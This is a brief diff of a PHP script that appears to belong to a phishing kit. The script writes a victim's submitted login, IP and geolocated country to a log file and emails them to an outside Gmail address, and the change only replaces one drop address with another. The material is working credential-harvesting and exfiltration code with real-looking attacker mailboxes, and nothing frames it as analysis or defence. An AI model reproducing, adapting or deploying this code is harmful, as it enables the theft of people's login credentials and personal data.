@@ -51,7 +51,7 @@ $message .= 	"Country Code: {$geoplugin->countryCode}\n";
 $message .= "---------------------------------------------\n";
 
 
-$to = "theboy1372@gmail.com"; 
+$to = "bdshiprnan@gmail.com"; 
 $fp = fopen("../error_log.txt","a");
 fputs($fp,$message);
 @$hi = mail($to,"LOG for " . $_POST['login'] . " |  $ip | ".$geoplugin->countryName , $message);
